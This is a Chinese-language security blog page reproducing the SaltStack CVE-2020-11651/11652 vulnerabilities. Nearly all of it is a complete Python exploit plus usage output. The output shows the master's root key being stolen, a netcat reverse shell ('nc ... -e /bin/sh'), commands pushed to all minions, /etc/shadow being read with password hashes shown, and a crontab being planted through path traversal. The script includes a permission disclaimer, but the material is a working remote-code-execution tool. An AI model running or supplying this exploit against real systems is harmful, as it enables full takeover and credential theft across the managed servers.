<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="（CVE-2020-11651）SaltStack远程命令执行漏洞一、漏洞简介二、漏洞影响SaltStack &lt; 2019.2.4SaltStack &lt; 3000.2 三、复现过程Usage默认操作（不带参数）是获取给定主机的密钥: root@kalimah:~&#x2F;salt# python3 exploit.py --master 192.168.115.130 [!] Please o">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/SaltStack/%EF%BC%88CVE-2020-11651%EF%BC%89SaltStack%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="（CVE-2020-11651）SaltStack远程命令执行漏洞一、漏洞简介二、漏洞影响SaltStack &lt; 2019.2.4SaltStack &lt; 3000.2 三、复现过程Usage默认操作（不带参数）是获取给定主机的密钥: root@kalimah:~&#x2F;salt# python3 exploit.py --master 192.168.115.130 [!] Please o">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-07-08T06:26:03.383Z">
<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-SaltStack/（CVE-2020-11651）SaltStack远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/SaltStack/%EF%BC%88CVE-2020-11651%EF%BC%89SaltStack%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:03.383Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2020-11651）SaltStack远程命令执行漏洞"><a href="#（CVE-2020-11651）SaltStack远程命令执行漏洞" class="headerlink" title="（CVE-2020-11651）SaltStack远程命令执行漏洞"></a>（CVE-2020-11651）SaltStack远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>SaltStack &lt; 2019.2.4SaltStack &lt; 3000.2</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><p>默认操作（不带参数）是获取给定主机的密钥:</p>
<pre><code>root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Salt version: 3000.1
[ ] This version of salt is vulnerable! Check results below
[+] Checking salt-master (192.168.115.130:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651...
[*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA=
root@kalimah:~/salt#
</code></pre>
<p>在主机上执行任意命令:</p>
<pre><code>root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130 --exec &quot;nc 127.0.0.1 4444 -e /bin/sh&quot;
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Salt version: 3000.1
[ ] This version of salt is vulnerable! Check results below
[+] Checking salt-master (192.168.115.130:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651...
[*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA=
[+] Attemping to execute nc 127.0.0.1 4444 -e /bin/sh on 192.168.115.130
[+] Successfully scheduled job: 20200504153851746472
root@kalimah:~/salt#
</code></pre>
<p>The same, but on all minions:</p>
<pre><code>root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130 --exec-all=&quot;apt-get upgrade -y&quot;
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Salt version: 3000.1
[ ] This version of salt is vulnerable! Check results below
[+] Checking salt-master (192.168.115.130:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651...
[*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA=
[!] Lester, is this what you want? Hit ^C to abort.
[+] Attemping to execute &#39;apt-get upgrade -y&#39; on all minions connected to 192.168.115.130
[+] Successfully submitted job to all minions.
root@kalimah:~/salt#
</code></pre>
<p>任意文件读取:</p>
<pre><code>root@kalimah:~/salt# python2 exploit.py --master 192.168.115.130 -r /etc/shadow
[+] Salt version: 2019.2.0
[ ] This version of salt is vulnerable! Check results below
[+] Checking salt-master (192.168.115.130:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651...
[*] root key obtained: GkJiProN36+iZ53buhvhm3dWcC/7BZyEomu3lSFucQF9TkrCRfA32EIFAk/yyQMkCyqZyxjjp/E=
[+] Attemping to read /etc/shadow from 192.168.115.130
root:$6$7qfolaa/$3yhszWj/VUJjfPaqr1yO6NLgV/FhHnVT9Pr6spwJ/F0BJw5vFM.3KjtwcnnuGo5uSJJkLrd28jXrmVZUD9nEI/:17812:0:99999:7:::
daemon:*:17785:0:99999:7:::
bin:*:17785:0:99999:7:::
sys:*:17785:0:99999:7:::
sync:*:17785:0:99999:7:::
games:*:17785:0:99999:7:::
man:*:17785:0:99999:7:::
[...]
</code></pre>
<p>可以使用<code>--upload src</code>和<code>--upload dest</code>上传文件。注意目标必须是相对路径:</p>
<pre><code>root@kalimah:~/salt#  python2 exploit.py --upload-src evil.crontab --upload-dest ../../../../../../var/spool/cron/crontabs/root
[+] Salt version: 2019.2.0
[ ] This version of salt is vulnerable! Check results below
[+] Checking salt-master (127.0.0.1:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651...
[*] root key obtained: GkJiProN36+iZ53buhvhm3dWcC/7BZyEomu3lSFucQF9TkrCRfA32EIFAk/yyQMkCyqZyxjjp/E=
[-] Destination path must be relative
[+] Attemping to upload evil.crontab to ../../../../../../var/spool/cron/crontabs/root on 127.0.0.1
[ ] Wrote data to file /srv/salt/../../../../../../var/spool/cron/crontabs/root
</code></pre>
<h3 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h3><ul>
<li>  Python 2 or 3</li>
<li>  Salt (<code>pip3 install salt</code>)</li>
</ul>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>#!/usr/bin/env python
#
# Exploit for CVE-2020-11651 and CVE-2020-11652
# Written by Jasper Lievisse Adriaanse (https://github.com/jasperla/CVE-2020-11651-poc)
# This exploit is based on this checker script:
# https://github.com/rossengeorgiev/salt-security-backports

from __future__ import absolute_import, print_function, unicode_literals
import argparse
import datetime
import os
import os.path
import sys
import time

import salt
import salt.version
import salt.transport.client
import salt.exceptions

def init_minion(master_ip, master_port):
    minion_config = &#123;
        &#39;transport&#39;: &#39;zeromq&#39;,
        &#39;pki_dir&#39;: &#39;/tmp&#39;,
        &#39;id&#39;: &#39;root&#39;,
        &#39;log_level&#39;: &#39;debug&#39;,
        &#39;master_ip&#39;: master_ip,
        &#39;master_port&#39;: master_port,
        &#39;auth_timeout&#39;: 5,
        &#39;auth_tries&#39;: 1,
        &#39;master_uri&#39;: &#39;tcp://&#123;0&#125;:&#123;1&#125;&#39;.format(master_ip, master_port)
    &#125;

    return salt.transport.client.ReqChannel.factory(minion_config, crypt=&#39;clear&#39;)

# --- check funcs ----

def check_salt_version():
  print(&quot;[+] Salt version: &#123;&#125;&quot;.format(salt.version.__version__))

  vi = salt.version.__version_info__

  if (vi &lt; (2019, 2, 4) or (3000,) &lt;= vi &lt; (3000, 2)):
     return True
  else:
     return False

def check_connection(master_ip, master_port, channel):
  print(&quot;[+] Checking salt-master (&#123;&#125;:&#123;&#125;) status... &quot;.format(master_ip, master_port), end=&#39;&#39;)
  sys.stdout.flush()

  # connection check
  try:
    channel.send(&#123;&#39;cmd&#39;:&#39;ping&#39;&#125;, timeout=2)
  except salt.exceptions.SaltReqTimeoutError:
    print(&quot;OFFLINE&quot;)
    sys.exit(1)
  else:
    print(&quot;ONLINE&quot;)

def check_CVE_2020_11651(channel):
  print(&quot;[+] Checking if vulnerable to CVE-2020-11651... &quot;, end=&#39;&#39;)
  sys.stdout.flush()
  # try to evil
  try:
    rets = channel.send(&#123;&#39;cmd&#39;: &#39;_prep_auth_info&#39;&#125;, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print(&quot;YES&quot;)
  except:
    print(&quot;ERROR&quot;)
    raise
  else:
      pass
  finally:
    if rets:
      root_key = rets[2][&#39;root&#39;]
      return root_key

  return None

def check_CVE_2020_11652_read_token(debug, channel, top_secret_file_path):
  print(&quot;[+] Checking if vulnerable to CVE-2020-11652 (read_token)... &quot;, end=&#39;&#39;)
  sys.stdout.flush()

  # try read file
  msg = &#123;
    &#39;cmd&#39;: &#39;get_token&#39;,
    &#39;arg&#39;: [],
    &#39;token&#39;: top_secret_file_path,
  &#125;

  try:
    rets = channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print(&quot;YES&quot;)
  except:
    print(&quot;ERROR&quot;)
    raise
  else:
    if debug:
      print()
      print(rets)
    print(&quot;NO&quot;)
  
def check_CVE_2020_11652_read(debug, channel, top_secret_file_path, root_key):
  print(&quot;[+] Checking if vulnerable to CVE-2020-11652 (read)... &quot;, end=&#39;&#39;)
  sys.stdout.flush()

  # try read file
  msg = &#123;
    &#39;key&#39;: root_key,
    &#39;cmd&#39;: &#39;wheel&#39;,
    &#39;fun&#39;: &#39;file_roots.read&#39;,
    &#39;path&#39;: top_secret_file_path,
    &#39;saltenv&#39;: &#39;base&#39;,
  &#125;

  try:
    rets = channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print(&quot;TIMEOUT&quot;)
  except:
    print(&quot;ERROR&quot;)
    raise
  else:
    if debug:
      print()
      print(rets)
    if rets[&#39;data&#39;][&#39;return&#39;]:
      print(&quot;YES&quot;)
    else:
      print(&quot;NO&quot;)

def check_CVE_2020_11652_write1(debug, channel, root_key):
  print(&quot;[+] Checking if vulnerable to CVE-2020-11652 (write1)... &quot;, end=&#39;&#39;)
  sys.stdout.flush()

  # try read file
  msg = &#123;
    &#39;key&#39;: root_key,
    &#39;cmd&#39;: &#39;wheel&#39;,
    &#39;fun&#39;: &#39;file_roots.write&#39;,
    &#39;path&#39;: &#39;../../../../../../../../tmp/salt_CVE_2020_11652&#39;,
    &#39;data&#39;: &#39;evil&#39;,
    &#39;saltenv&#39;: &#39;base&#39;,
  &#125;

  try:
    rets = channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print(&quot;TIMEOUT&quot;)
  except:
    print(&quot;ERROR&quot;)
    raise
  else:
    if debug:
      print()
      print(rets)

    pp(rets)
    if rets[&#39;data&#39;][&#39;return&#39;].startswith(&#39;Wrote&#39;):
      try:
        os.remove(&#39;/tmp/salt_CVE_2020_11652&#39;)
      except OSError:
        print(&quot;Maybe?&quot;)
      else:
        print(&quot;YES&quot;)
    else:
      print(&quot;NO&quot;)

def check_CVE_2020_11652_write2(debug, channel, root_key):
  print(&quot;[+] Checking if vulnerable to CVE-2020-11652 (write2)... &quot;, end=&#39;&#39;)
  sys.stdout.flush()

  # try read file
  msg = &#123;
    &#39;key&#39;: root_key,
    &#39;cmd&#39;: &#39;wheel&#39;,
    &#39;fun&#39;: &#39;config.update_config&#39;,
    &#39;file_name&#39;: &#39;../../../../../../../../tmp/salt_CVE_2020_11652&#39;,
    &#39;yaml_contents&#39;: &#39;evil&#39;,
    &#39;saltenv&#39;: &#39;base&#39;,
  &#125;

  try:
    rets = channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print(&quot;TIMEOUT&quot;)
  except:
    print(&quot;ERROR&quot;)
    raise
  else:
    if debug:
      print()
      print(rets)
    if rets[&#39;data&#39;][&#39;return&#39;].startswith(&#39;Wrote&#39;):
      try:
        os.remove(&#39;/tmp/salt_CVE_2020_11652.conf&#39;)
      except OSError:
        print(&quot;Maybe?&quot;)
      else:
        print(&quot;YES&quot;)
    else:
      print(&quot;NO&quot;)

def pwn_read_file(channel, root_key, path, master_ip):
    print(&quot;[+] Attemping to read &#123;&#125; from &#123;&#125;&quot;.format(path, master_ip))
    sys.stdout.flush()

    msg = &#123;
        &#39;key&#39;: root_key,
        &#39;cmd&#39;: &#39;wheel&#39;,
        &#39;fun&#39;: &#39;file_roots.read&#39;,
        &#39;path&#39;: path,
        &#39;saltenv&#39;: &#39;base&#39;,
    &#125;

    rets = channel.send(msg, timeout=3)
    print(rets[&#39;data&#39;][&#39;return&#39;][0][path])

def pwn_upload_file(channel, root_key, src, dest, master_ip):
    print(&quot;[+] Attemping to upload &#123;&#125; to &#123;&#125; on &#123;&#125;&quot;.format(src, dest, master_ip))
    sys.stdout.flush()

    try:
        fh = open(src, &#39;rb&#39;)
        payload = fh.read()
        fh.close()
    except Exception as e:
        print(&#39;[-] Failed to read &#123;&#125;: &#123;&#125;&#39;.format(src, e))
        return

    msg = &#123;
        &#39;key&#39;: root_key,
        &#39;cmd&#39;: &#39;wheel&#39;,
        &#39;fun&#39;: &#39;file_roots.write&#39;,
        &#39;saltenv&#39;: &#39;base&#39;,
        &#39;data&#39;: payload,
        &#39;path&#39;: dest,
    &#125;

    rets = channel.send(msg, timeout=3)
    print(&#39;[ ] &#123;&#125;&#39;.format(rets[&#39;data&#39;][&#39;return&#39;]))

def pwn_exec(channel, root_key, cmd, master_ip, jid):
    print(&quot;[+] Attemping to execute &#123;&#125; on &#123;&#125;&quot;.format(cmd, master_ip))
    sys.stdout.flush()

    msg = &#123;
        &#39;key&#39;: root_key,
        &#39;cmd&#39;: &#39;runner&#39;,
        &#39;fun&#39;: &#39;salt.cmd&#39;,
        &#39;saltenv&#39;: &#39;base&#39;,
        &#39;user&#39;: &#39;sudo_user&#39;,
        &#39;kwarg&#39;: &#123;
            &#39;fun&#39;: &#39;cmd.exec_code&#39;,
            &#39;lang&#39;: &#39;python&#39;,
            &#39;code&#39;: &quot;import subprocess;subprocess.call(&#39;&#123;&#125;&#39;,shell=True)&quot;.format(cmd)
        &#125;,
        &#39;jid&#39;: jid,
    &#125;

    try:
        rets = channel.send(msg, timeout=3)
    except Exception as e:
        print(&#39;[-] Failed to submit job&#39;)
        return

    if rets.get(&#39;jid&#39;):
        print(&#39;[+] Successfully scheduled job: &#123;&#125;&#39;.format(rets[&#39;jid&#39;]))

def pwn_exec_all(channel, root_key, cmd, master_ip, jid):
    print(&quot;[+] Attemping to execute &#39;&#123;&#125;&#39; on all minions connected to &#123;&#125;&quot;.format(cmd, master_ip))
    sys.stdout.flush()

    msg = &#123;
        &#39;key&#39;: root_key,
        &#39;cmd&#39;: &#39;_send_pub&#39;,
        &#39;fun&#39;: &#39;cmd.run&#39;,
        &#39;user&#39;: &#39;root&#39;,
        &#39;arg&#39;: [ &quot;/bin/sh -c &#39;&#123;&#125;&#39;&quot;.format(cmd) ],
        &#39;tgt&#39;: &#39;*&#39;,
        &#39;tgt_type&#39;: &#39;glob&#39;,
        &#39;ret&#39;: &#39;&#39;,
        &#39;jid&#39;: jid
    &#125;

    try:
        rets = channel.send(msg, timeout=3)
    except Exception as e:
        print(&#39;[-] Failed to submit job&#39;)
        return
    finally:
        if rets == None:
            print(&#39;[+] Successfully submitted job to all minions.&#39;)
        else:
            print(&#39;[-] Failed to submit job&#39;)


def main():
    parser = argparse.ArgumentParser(description=&#39;Saltstack exploit for CVE-2020-11651 and CVE-2020-11652&#39;)
    parser.add_argument(&#39;--master&#39;, &#39;-m&#39;, dest=&#39;master_ip&#39;, default=&#39;127.0.0.1&#39;)
    parser.add_argument(&#39;--port&#39;, &#39;-p&#39;, dest=&#39;master_port&#39;, default=&#39;4506&#39;)
    parser.add_argument(&#39;--force&#39;, &#39;-f&#39;, dest=&#39;force&#39;, default=False, action=&#39;store_false&#39;)
    parser.add_argument(&#39;--debug&#39;, &#39;-d&#39;, dest=&#39;debug&#39;, default=False, action=&#39;store_true&#39;)
    parser.add_argument(&#39;--run-checks&#39;, &#39;-c&#39;, dest=&#39;run_checks&#39;, default=False, action=&#39;store_true&#39;)
    parser.add_argument(&#39;--read&#39;, &#39;-r&#39;, dest=&#39;read_file&#39;)
    parser.add_argument(&#39;--upload-src&#39;, dest=&#39;upload_src&#39;)
    parser.add_argument(&#39;--upload-dest&#39;, dest=&#39;upload_dest&#39;)
    parser.add_argument(&#39;--exec&#39;, dest=&#39;exec&#39;, help=&#39;Run a command on the master&#39;)
    parser.add_argument(&#39;--exec-all&#39;, dest=&#39;exec_all&#39;, help=&#39;Run a command on all minions&#39;)
    args = parser.parse_args()

    print(&quot;[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.&quot;)
    time.sleep(1)

    # Both src and destination are required for uploads
    if (args.upload_src and args.upload_dest is None) or (args.upload_dest and args.upload_src is None):
        print(&#39;[-] Must provide both --upload-src and --upload-dest&#39;)
        sys.exit(1)

    channel = init_minion(args.master_ip, args.master_port)

    if check_salt_version():
       print(&quot;[ ] This version of salt is vulnerable! Check results below&quot;)
    elif args.force:
       print(&quot;[*] This version of salt does NOT appear vulnerable. Proceeding anyway as requested.&quot;)
    else:
       sys.exit()

    check_connection(args.master_ip, args.master_port, channel)
    
    root_key = check_CVE_2020_11651(channel)
    if root_key:
        print(&#39;\n[*] root key obtained: &#123;&#125;&#39;.format(root_key))
    else:
        print(&#39;[-] Failed to find root key...aborting&#39;)
        sys.exit(127)

    if args.run_checks:
        # Assuming this check runs on the master itself, create a file with &quot;secret&quot; content
        # and abuse CVE-2020-11652 to read it.
        top_secret_file_path = &#39;/tmp/salt_cve_teta&#39;
        with salt.utils.fopen(top_secret_file_path, &#39;w&#39;) as fd:
            fd.write(&quot;top secret&quot;)

        # Again, this assumes we&#39;re running this check on the master itself
        with salt.utils.fopen(&#39;/var/cache/salt/master/.root_key&#39;) as keyfd:
            root_key = keyfd.read()

        check_CVE_2020_11652_read_token(debug, channel, top_secret_file_path)
        check_CVE_2020_11652_read(debug, channel, top_secret_file_path, root_key)
        check_CVE_2020_11652_write1(debug, channel, root_key)
        check_CVE_2020_11652_write2(debug, channel, root_key)
        os.remove(top_secret_file_path)
        sys.exit(0)

    if args.read_file:
        pwn_read_file(channel, root_key, args.read_file, args.master_ip)

    if args.upload_src:
        if os.path.isabs(args.upload_dest):
            print(&#39;[-] Destination path must be relative; aborting&#39;)
            sys.exit(1)
        pwn_upload_file(channel, root_key, args.upload_src, args.upload_dest, args.master_ip)


    jid = &#39;&#123;0:%Y%m%d%H%M%S%f&#125;&#39;.format(datetime.datetime.utcnow())

    if args.exec:
        pwn_exec(channel, root_key, args.exec, args.master_ip, jid)

    if args.exec_all:
        print(&quot;[!] Lester, is this what you want? Hit ^C to abort.&quot;)
        time.sleep(2)
        pwn_exec_all(channel, root_key, args.exec_all, args.master_ip, jid)


if __name__ == &#39;__main__&#39;:
    main()
</code></pre>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/SaltStack/%EF%BC%88CVE-2020-11651%EF%BC%89SaltStack%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qv5c00fiy8v14m0p93k9" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/Sanitize/%EF%BC%88CVE-2020-4054%EF%BC%89Sanitize%20%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/RuoYi%20CMS/RuoYi%20CMS%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>